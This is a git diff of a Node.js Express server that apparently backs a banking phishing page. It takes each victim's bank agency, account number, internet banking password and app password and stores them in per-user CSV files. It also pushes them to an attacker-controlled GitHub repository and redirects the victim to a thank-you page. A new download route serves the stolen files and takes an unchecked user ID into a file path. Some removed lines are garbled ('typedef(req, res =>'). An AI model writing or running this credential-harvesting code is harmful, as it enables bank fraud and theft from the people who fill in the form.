@@ -1,4 +1,3 @@
-// server.js
 require('dotenv').config();
 const express = require("express");
 const compression = require("compression");
@@ -8,42 +7,47 @@ const path = require("path");
 const { Octokit } = require("@octokit/rest");
 const fs = require("fs");
 
-require('dotenv').config();
-
 const app = express();
 const upload = multer();
 
-// ativa gzip/brotli para todas as respostas
+// Ativa gzip/brotli para todas as respostas
 app.use(compression());
 
-// para servir HTML/CSS/JS/IMG com compressão
+// Para servir HTML/CSS/JS/IMG com compressão
 app.use(express.static(path.join(__dirname, "public")));
 app.use(express.urlencoded({ extended: true }));
 
-// GitHub config via environment variables
+// Configurações do GitHub via variáveis de ambiente
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-const GITHUB_OWNER = process.env.GITHUB_OWNER;      // ex: "seu-usuario"
-const GITHUB_REPO  = process.env.GITHUB_REPO;       // ex: "nome-do-repo"
-const BASE_PATH    = process.env.GITHUB_BASE_PATH || '';
+const GITHUB_OWNER = process.env.GITHUB_OWNER;  // ex: "seu-usuario"
+const GITHUB_REPO = process.env.GITHUB_REPO;    // ex: "nome-do-repo"
+const BASE_PATH = process.env.GITHUB_BASE_PATH || '';
 
 const octokit = new Octokit({ auth: GITHUB_TOKEN });
 
-// CSV writer (arquivo local)
-const csvWriter = createObjectCsvWriter({
-  path: "dados_formulario.csv",
-  header: [
-    { id: "titularidade", title: "Titularidade" },
-    { id: "tipo_conta", title: "Tipo de Conta" },
-    { id: "agencia", title: "Agência" },
-    { id: "conta", title: "Conta" },
-    { id: "senhaInternet", title: "Senha da Internet" },
-    { id: "senhaApp", title: "Senha Digital" }
-  ],
-  append: true
-});
+// Função para criar um escritor CSV para cada usuário
+function getCsvWriter(userId) {
+  const dir = path.join(__dirname, 'usuarios');
+  if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir, { recursive: true });
+  }
 
-// processa envio do formulário
-typedef(req, res => {
+  return createObjectCsvWriter({
+    path: path.join(dir, `${userId}.csv`),
+    header: [
+      { id: "titularidade", title: "Titularidade" },
+      { id: "tipo_conta", title: "Tipo de Conta" },
+      { id: "agencia", title: "Agência" },
+      { id: "conta", title: "Conta" },
+      { id: "senhaInternet", title: "Senha da Internet" },
+      { id: "senhaApp", title: "Senha Digital" }
+    ],
+    append: true
+  });
+}
+
+// Processa o envio do formulário
+app.post("/processa_formulario", (req, res) => {
   const {
     titularidade,
     tipo_conta,
@@ -51,7 +55,7 @@ typedef(req, res => {
     login,
     internet,
     app: senhaApp,
-    user_id                            // campo oculto ou IP para distinguir usuário
+    user_id
   } = req.body;
 
   if (!agency || !login || !internet || !senhaApp || !user_id) {
@@ -67,37 +71,40 @@ typedef(req, res => {
     senhaApp
   }];
 
-  // 1) salva localmente
+  // 1) Salva localmente no CSV do usuário
+  const csvWriter = getCsvWriter(user_id);
   csvWriter.writeRecords(registro)
-    .catch(err => console.error("Erro ao salvar local CSV:", err));
+    .then(() => console.log("Dados salvos no CSV do usuário com sucesso."))
+    .catch(err => console.error("Erro ao salvar localmente no CSV:", err));
 
-  // 2) envia ao GitHub
+  // 2) Envia ao GitHub
   saveToGitHub(user_id, registro)
     .then(() => console.log("Dados enviados ao GitHub com sucesso."))
     .catch(err => console.error("Erro ao salvar no GitHub:", err));
 
-  // redireciona imediatamente, não espera GitHub
+  // Redireciona para a página de agradecimento
   res.redirect("/agradecimento.html");
 });
 
-// função para criar ou atualizar CSV de usuário no GitHub
-typedef async function saveToGitHub(userId, registros) {
-  const filePathInRepo = path.join(BASE_PATH, `${userId}.csv`).replace(/\\/g, '/');
+// Função para criar ou atualizar CSV de usuário no GitHub
+async function saveToGitHub(userId, registros) {
+  const filePathInRepo = BASE_PATH
+    ? `${BASE_PATH}/${userId}.csv`
+    : `${userId}.csv`;
 
-  // monta conteúdo CSV (cabeçalho + linhas)
-  let csvContent = registros.map(r =>
+  // Monta conteúdo CSV (linhas, sem cabeçalho)
+  const csvContent = registros.map(r =>
     `${r.titularidade},${r.tipo_conta},${r.agencia},${r.conta},${r.senhaInternet},${r.senhaApp}`
   ).join("\n");
 
   try {
-    // tenta ler o arquivo existente para obter sha e conteúdo
+    // Tenta ler o arquivo existente para obter sha e conteúdo
     const { data: existing } = await octokit.repos.getContent({
       owner: GITHUB_OWNER,
       repo: GITHUB_REPO,
       path: filePathInRepo
     });
 
-    // decodifica, adiciona novas linhas e re-encode
     const prev = Buffer.from(existing.content, 'base64').toString('utf-8');
     const updated = prev.trim() + "\n" + csvContent;
     const contentEncoded = Buffer.from(updated, 'utf-8').toString('base64');
@@ -130,23 +137,22 @@ typedef async function saveToGitHub(userId, registros) {
   }
 }
 
-// rota para download do CSV local
-app.get("/download_csv", (req, res) => {
-  const filePath = path.join(__dirname, "dados_formulario.csv");
-  res.download(filePath, "dados_formulario.csv", err => {
-    if (err) {
-      console.error("Erro ao enviar CSV:", err);
-      res.status(500).send("Não foi possível baixar o CSV.");
-    }
-  });
+// Rota para download do CSV de um usuário específico
+app.get("/download_csv/:userId", (req, res) => {
+  const userId = req.params.userId;
+  const filePath = path.join(__dirname, "usuarios", `${userId}.csv`);
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("Arquivo não encontrado");
+  }
+  res.download(filePath, `${userId}.csv`);
 });
 
-// fallback para SPA
+// Fallback para SPA
 app.get("/*", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// inicia servidor na porta do Render ou 3000
+// Inicia o servidor na porta do Render ou 3000
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Servidor rodando em http://localhost:${PORT}`);
